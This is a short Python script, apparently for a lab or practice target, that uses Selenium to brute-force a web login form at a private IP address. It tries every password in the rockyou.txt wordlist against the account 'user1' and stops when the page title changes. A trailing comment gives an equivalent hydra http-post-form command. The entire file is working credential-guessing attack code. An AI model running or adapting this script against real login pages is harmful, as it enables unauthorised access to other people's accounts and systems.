from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By


options = webdriver.FirefoxOptions()
driver = webdriver.Firefox(options=options)
driver.get("http://192.168.2.135:5000/login")
title = ""

rockyou = open(file="rockyou.txt", mode="r", encoding="iso-8859-1")
passwords = rockyou.readlines()
rockyou.close()


i = 1

for password in passwords:
    print(f"Trying: {password}")

    controls = driver.find_elements(By.CLASS_NAME, "form-control")

    assert(len(controls) == 2)
    controls[0].clear()
    controls[0].send_keys("user1")
    controls[1].clear()
    controls[1].send_keys(password)

    button = driver.find_elements(By.CLASS_NAME, "btn")
    assert(len(button) == 1)
    button[0].click()
    print(driver.title)

    if driver.title != "Login":
        print(f"Password: {password}", i)
        break
    i += 1

driver.quit()

# sudo hydra -l user1 -P rockyou.txt -f 192.168.2.135 -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:S=user1"
